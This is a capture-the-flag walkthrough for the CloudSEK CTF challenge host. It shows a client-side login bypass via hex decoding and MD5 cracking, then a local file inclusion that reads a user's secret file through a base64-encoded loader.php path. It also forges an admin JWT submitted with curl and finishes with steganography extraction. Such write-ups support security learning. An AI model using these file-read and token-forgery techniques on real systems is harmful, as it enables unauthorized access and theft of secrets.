# CloudSEK-CTF Walkthrough


## **Task 1** - To bypass the login page
- Navigate to the corresponding url *http://54.244.19.42/.*
![](images/login.png)
- As expected by entering arbitrary credentials we get an **"Incorrect credentials"** message.
![](images/invalid-login.png)
- Taking a look at the page source we can notice the peculiar **"loginFunction()"**
![](images/loginFunction().png)
- This function performs a set of checks on the password inputted by the user:
-  By converting the hex string in the outer if block to ASCII we can verify that **"x"** is being evaluated against the string **"CloudSEK_"**
```python3
>>> bytes.fromhex("436C6F756453454B5F").decode("utf-8")
'CloudSEK_'
```
- By decrypting the md5sum value in the inner if block we can verify that **"z"** is being evaluated against the string **"jeniffer"** 
- There are plenty of online tools to decrypt such hashes.
![](images/md5.png)
- Since there is no check against the username, we can leave it blank.
- Thus, by entering the password **CloudSEK_jennifer** we are prompted with the next page.
![](images/jared.png) 

## **Task 2** - To obtain jared's access_token located in the secret.txt file
- As hinted on the web page the **"secret.txt"** file is located in jared's home directory: **"/home/jared"**.
- This suggets a **Local File Inclusion(LFI)** vulnerability, which allows us to effectively read local files present on the host machine and in some cases allow **Remote Code Execution(RCE)**.
- After having experimented for a while I noticed that the default path appended, **"/loader.php?p=bWVzc2FnZTFfdG9famFyZWQudHh0Cg%3D%3D&password="** , is base64-url encoded.
```python3
>>> import base64
>>> base64.urlsafe_b64decode("bWVzc2FnZTFfdG9famFyZWQudHh0Cg==")
b'message1_to_jared.txt\n'
``` 
- This confirms that the page displayed the contents of the file **"message1_to_jared.txt"** after loading it.
- Thus, we have identified the bug and can now try reading the contents of **"/home/jared/secret.txt"** by encoding it in base64-url form, and replacing it in the url.
```python3
>>> base64.urlsafe_b64encode(b"/home/jared/secret.txt")
b'L2hvbWUvamFyZWQvc2VjcmV0LnR4dA=='
```
-  Upon visiting *http://54.244.19.42/loader.php?p=L2hvbWUvamFyZWQvc2VjcmV0LnR4dA==&password=CloudSEK_jeniffer* we can obtain jared's access_token.
![](images/access_token.png)

## **Task 3** - To login into the developer portal using the JWT access_token
- A JWT access_token is a mechanism to ensure integrity of a user.
- It is made up of three parts, **Header.Payload.Signature**, each separated by a dot and base64-url encoded.
- We can decode the token either online or manually to further analyse it.
![](images/access_token_decoded.png)
- To locate the developer portal we can try fuzzing the url with automated scanners, but first it is a good idea to check if there is a **robots.txt** file.
- A **robots.txt** file is used to tell search engine crawlers which files they can or can't request from your site. 
- Let's navigate to *http://54.244.19.42/robots.txt*
![](images/robots.png)
- We can now see the location of the developer login portal.
![](images/dev-login.png)
- Let's make a POST request with **cURL** to the required url.
```bash
┌─[parrot@parrot]─[~/Desktop/cloudsek]
└──╼ $curl -X POST 54.244.19.42/dev/login.php
No 'access_token' specified
┌─[parrot@parrot]─[~/Desktop/cloudsek]
└──╼ $curl -X POST 54.244.19.42/dev/login.php --data "access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiamFyZWQifQ.9lYEicuJKZAqh8lAX4woWaBWGJ-bGIqWj_gsOsdVjGQ"
<b align=center>This page can only be accessed by admin user</b>
```
- By modifying the payload to **{"user": "admin"}** we get the following.
```bash
┌─[parrot@parrot]─[~/Desktop/cloudsek]
└──╼ $curl -X POST 54.244.19.42/dev/login.php --data "access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.xLtLdUxXsGB7EqP49a8xQziqpjkVKeJ9o2nix4xLf5M"
<script>window.location.href="../CloudSEK_to_win_page.html";</script>
```
- Navigating to the corresponding page *http://54.244.19.42/CloudSEK_to_win_page.html* we get:
![](images/close-winner.png)

## **Task 4** - Image Steganography
- As hinted by the page we must *look in the dark*.
- Let's download the image and analyse it further.
```bash
┌─[parrot@parrot]─[~/Desktop/cloudsek]
└──╼ $wget -q http://54.244.19.42/CloudSEK_AboutToWin.jpg
┌─[parrot@parrot]─[~/Desktop/cloudsek]
└──╼ $file CloudSEK_AboutToWin.jpg 
CloudSEK_AboutToWin.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, comment: "'/ThE_FlAg_PaGe.html'", baseline, precision 8, 1023x491, components 3
```
- The **"file"** command is used to determine the type of file and data contained in it. In this case we have easily identified **"/ThE_FlAg_PaGe.html"**, but most of the times further analysis with the **"exiftool"** command to read the metadata can prove useful.
- Navigating to the corresponding page *http://54.244.19.42//ThE_FlAg_PaGe.html* we get:
![](images/winner.png)

## **Task 5** - Locate the submission form
- This is another image steganography task.
- Let's download the image and analyse it further.
```bash
┌─[parrot@parrot]─[~/Desktop/cloudsek]
└──╼ $wget -q http://54.244.19.42/you_are_winner_indeed_img.jpg
┌─[parrot@parrot]─[~/Desktop/cloudsek]
└──╼ $file you_are_winner_indeed_img.jpg 
you_are_winner_indeed_img.jpg: JPEG image data, JFIF standard 1.02, aspect ratio, density 640x639, segment length 16, baseline, precision 8, 852x480, components 3
```
- We can use **steghide**, a popular tool for steganography, to extract the hidden message. The passphrase is the flag, **CloudSEK_CTF_2020{H4cKiNG_i$_FuN}**, as hinted on the webpage.
```
┌─[parrot@parrot]─[~/Desktop/cloudsek]
└──╼ $steghide --extract -sf you_are_winner_indeed_img.jpg 
Enter passphrase: 
wrote extracted data to "compl3tion_m3ssag3.txt".
┌─[parrot@parrot]─[~/Desktop/cloudsek]
└──╼ $cat compl3tion_m3ssag3.txt 
Congratulations on making it to the end!
Please submit a detailed walkthrough PDF along with proper steps and screenshots on the link below.
We hope to see you in the interview:

https://forms.gle/CA9vHT6XaisS9HgR6

Happy Hacking!

~CloudSEK family
```
We have successfully completed all the tasks! 





